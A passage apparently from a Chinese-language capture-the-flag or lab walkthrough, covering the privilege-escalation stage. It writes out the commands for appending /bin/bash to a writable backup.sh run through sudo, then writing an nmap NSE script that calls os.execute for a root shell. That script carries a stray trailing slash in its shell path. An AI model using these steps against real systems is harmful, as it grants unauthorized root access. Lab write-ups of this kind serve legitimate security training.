三：提权

sudo -l

发现jens可以免密码执行root权限

cd /home/jens

ll

发现backup.sh可以执行读写

我们将/bin/bash 写入

echo ‘/bin/bash’\>>backup.sh

sudo -u jens ./backup.sh

![](../Images/82800f721170455b1a6f1c875ba9868a.png)

  

![](../Images/49077aaf6cb97533f06ea3c7044f0427.png)

切换到jens用户

同样sudo -l

发现nmap脚本可以提权

尝试写入一个可执行的nmap脚本文件

echo “os.execute(‘/bin/bash/’)” \>/tmp/1.nse

sudo nmap --script=/tmp/1.nse

![](../Images/ae6714adacfe98013820af36e7490c85.png)
